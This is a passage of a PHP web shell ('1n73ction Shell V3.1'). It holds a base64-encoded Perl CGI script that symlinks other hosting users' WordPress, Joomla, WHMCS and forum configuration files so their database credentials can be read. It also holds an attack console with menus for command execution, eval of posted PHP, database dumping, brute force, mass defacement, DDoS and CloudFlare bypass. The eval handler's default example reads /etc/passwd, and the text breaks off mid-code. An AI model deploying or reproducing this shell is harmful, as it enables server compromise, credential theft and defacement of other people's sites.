Qo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQoka29sYT0kbXNyLiIvIi4kdXNlcjsNCiRrb2xhPX5zL1xuLy9nOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYSAtIGhvbWUudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcyAtIHdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywka29sYS4nLSBDIE0gRiAudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGtvbGEuJy0gQyBNIEYgLSBmb3J1bS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGtvbGEuJy0gTXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywka29sYS4nLSBNeUJCIC0gZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nLSBPdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywka29sYS4nLSBCYWxpdGJhbmcudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWNsaWVudHMudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmdzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSB3aG1jcyAtIHdobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gd2htIC0gd2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLSBWQnVsbGV0aW4gLSBmb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGtvbGEuJwktIFBocEJCIC0gZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSB3aG1jIC0gd2htYy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJwktIHdobWNzMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nCS1tYW5nZXdobWNzLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nCS1teXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictb3Njb21tZXJjZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2FsZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd3dvcmRwcmVzcyAtIHdwIC0gYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBiZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLXdvcmRwcmVzcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRrb2xhLictIHdvcmRwcmVzcyAtIHNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSB0ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhIC0gam9vbWxhIC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSBqb29tbGEgLSBwcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gam9vLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictIGpvb21sYSAtIGNtcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gbmV3cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSBqb29tbGEgLSBuZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictIGpvb21sYSAtIGhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictIHZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy0gdmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1wYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictemVuY2FydC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLSB6ZW5jYXJ0IC0gc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLXNob3AtWkNzaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywka29sYS4nLSBzbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywka29sYS4nLSBzbWYgLSBzbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRrb2xhLictIHNtZiAtIGZvcnVtLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGtvbGEuJy0gc21mIC0gZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictIHVwbG9hZCAudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGtvbGEuJy0gbWFsYXkudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGtvbGEuJy0gbG9rb21lZGlhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGtvbGEuJy0gbG9rb21lZGlhLnR4dCcpOyANCiB9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPiZuYnNwOzwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9IndpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MDBweCI+PC90ZXh0YXJlYT4NCjxiciAvPjxiciAvPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAyMTJweCIgLz48YnIgLz48YnIgLz4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJIYWphciAuLiEiIHN0eWxlPSJ3aWR0aDogOTlweCIgLz4NCjxiciAvPg0KPC9mb3JtPic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPkRvbmUgISE8L3A+DQo8cD4mbmJzcDs8L3A+JzsNCmlmKCRGT1JNe3Rhcn0gbmUgIiIpew0Kb3BlbihJTkZPLCAidGFyLnRtcCIpOw0KQGxpbmVzID08SU5GTz4gOw0KY2xvc2UoSU5GTyk7DQpzeXN0ZW0oQGxpbmVzKTsNCnByaW50JzxwPjxhIGhyZWY9IicuJEZPUk17dGFyfS4nLnRhciI+IGRvd25sb2FkICBmaWxlPC9hPjwvcD4nOw0KfQ0KfQ0KIHByaW50Ig0KPC9ib2R5Pg0KPC9odG1sPiI7'; 
?>
<html><head><link rel="SHORTCUT ICON" href="http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png"><title>=[ 1n73ct10n privat shell ]=</title>
<script type="text/javascript">
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script>
<style type="text/css">
body{
	background:#000000;;
}
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid #00ff00;
}
*{
	font-size:11px;
	font-family:Tahoma,Verdana,Arial;
	color:#00ff00;
}
#menu{
	background:#111111;
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:#222222;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.main {
	width:100%;
}
.gaya {
	color: #00ff00;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:#00ff00;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid #00ff00;
	border-top:1px solid #00ff00;
}
.output {
	margin:auto;
	border:1px solid #00ff00;
	width:100%;
	height:400px;
	background:#000000;
	padding:0 2px;
}
.cmdbox{
	width:100%;
}
.head_info{
	padding: 0 4px;
}
.jaya{ font-family: ;}

.b374k{
	font-size:30px;
	padding:0;
	color:#444444;
}
.b374k_tbl{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid #333333;
}
.phpinfo table{
	width:100%;
	padding:0 0 0 0;
}
.phpinfo td{
	background:#111111;
	color:#cccccc;
padding:6px 8px;;
}
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #333333;
font-weight:normal;
}
.phpinfo h2, .phpinfo h2 a{
	text-align:center;
	font-size:16px;
	padding:0;
	margin:30px 0 0 0;
	background:#222222;
	padding:4px 0;
}
.explore{
width:100%;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 8px;
line-height:24px;
}
.explore th{
padding:3px 8px;
font-weight:normal;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid #00ff00;
}
.explore tr:hover{
background:#111111;
}
.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}

</style></head>
<script language='javascript'>
if (document.all||document.getElementById){
var thetitle=document.title
document.title=''
}
var data="Us3 Y0ur br41n biTch ! ! !";
var done=1;
function statusIn(text){
decrypt(text,22,22);
}
function statusOut(){
self.status='';
done=1;
}
function decrypt(text, max, delay){
if (done){
done = 0;
rantit(text, max, delay, 0, max);
} 
}
function rantit(text, runs_left, delay, charvar, max){
if (!done){
runs_left = runs_left - 1;
var status = text.substring(0,charvar);
for(var current_char = charvar; current_char < text.length; current_char++){
status += data.charAt(Math.round(Math.random()*data.length));
}
document.title = status;
var rerun = "rantit('" + text + "'," + runs_left + "," + delay + "," + charvar + "," + max + ");"
var new_char = charvar + 1;
var next_char = "rantit('" + text + "'," + max + "," + delay + "," + new_char + "," + max + ");"
if(runs_left > 0){
setTimeout(rerun, delay);
}
else{
if (charvar < text.length){
setTimeout(next_char, Math.round(delay*(charvar+3)/(charvar+1)));
}
else
{
done = 1;
}
}
}
}
if (document.all||document.getElementById)
statusIn(thetitle)
</script>

<body onLoad="document.getElementById('cmd').focus();">
<div class="main">
<!-- head info start here -->
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="?"><span class="b374k"><img src="http://www.fbvideo.16mb.com/files/1n73ction.png" /></span></a></td></tr><tr><td><b>1n73ction Shell V3.1 [ Special Edition ]</b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
<!-- menu start -->
<center><div id="menu">
<a href="?<?php echo "y=".$pwd; ?>"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxQ2GRnu/TgAAAJzSURBVDjLtZLPSxtBHMXf5semZDfS7KpIaWzRShoFD5UK9h6ai5eCPfZkwYJ4kF566a30H0gF24BUqDdjBT1VCFIsNBUWEw+ha2obpDGUXGR1Z7KZ+fbQRky1vfULAzPD4/MeMw/4H7O6ugoAsG17tFwuJwFgd3f3Qq3yN0g+n7+r6/oKgEtQMDWYGHx5kc539rC4uAgA2Hy/OaGq6oplWaVcLmdxxl9YlvUEALa2tv6dYGPjXSoS6chWKpWKaZpdoVBIL5VK+0NDQ/1END02NjZ/LsHc3BwAYG1tbSIYVLOFQuGzpmldgUDAkFKqvb2917a3t23GWDqXyz0BgPX19fYEy8vLKV3XswcHBxXDMLoikYghpaRW0kajwfbK5W834/F+ANOpVGr+FLC0tHRf0/TX+/tf7J6eniuappkA6IwBtSC2bX9NJBIDRPT05OTkuTL1aKpj9Pbox1qtdmgYxlXTNG8QEV3wPgRAcV23bllWfmRkZNh13VuKpmnBvr6+O1LK2szMzNtwOBxviYUQUBQFPp+vBYCU8jCTyaSOj48vA/hw6jI+Ph5JJpOfwuFwnIjAGKsvLCw8cxxHTE4+fGwY0RgRgYi+O44zPDs7W2/rgeu6CmMMjDFwziGE+JFIJF5Vq9VMs+kdcs7BOQdjDEdHR6fGgdZGCAHOOfx+P4gIQggZjUaps9OkRqNBjDHQr1E8z8M5QLVaheM4TZ/fBxDQbDZVz/MgJYFzHlRVFURQms2GqNfr4qIm+mOx2L3u7u5hKSVCIXVPSvGmsFNUBuLxB8FA4DoAeJ63UywWswBk2x+l0+kW0P97KX80tnXfNj8B5NE5DOMV2T0AAAAASUVORK5CYII=' height="18" width="34"></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sql">Mysql</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">Database Dump</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">Php Info</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">Net Sploit</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">E-Mail</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">SQLI Scan</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=port-sc">Port Scan</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">Ddos</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=tool">Tools</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=python">python</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">Symlink</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=config">Config</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass">Bypass</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi">CgiShell</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi2012">CGI Telnet 2012</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">Domain</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jodexer">Joomla IndChange</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">VB IndChange</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">Wordpress ResPass</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">Joomla ResPass</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs">WHMCS Decoder</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone">Zone-H</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=wpbrute">Wordpress BruteForce</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jbrute">Joomla BruteForce</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">Cpanel BruteForce</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass-cf">Bypass CloudFlare</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=adfin">Admin Finder</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Password Hash</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid">Hash ID</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=string">Script Encode</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whois">Website Whois</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jss">Joomla Server Scanner</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cms_detect">Cms Detector</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=tutor">Tutorial & Ebook</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about">About</a>
<a href="?<?php echo "y=".$pwd;	?>&amp;x=logout">Log-Out</a>


</div></center>
<!-- menu end -->

<?php
@ini_set('display_errors', 0);
if(isset($_GET['x']) && ($_GET['x'] == 'php')){ ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
	echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>
</textarea>
<tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>

<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'sql'))
    {
    ?>
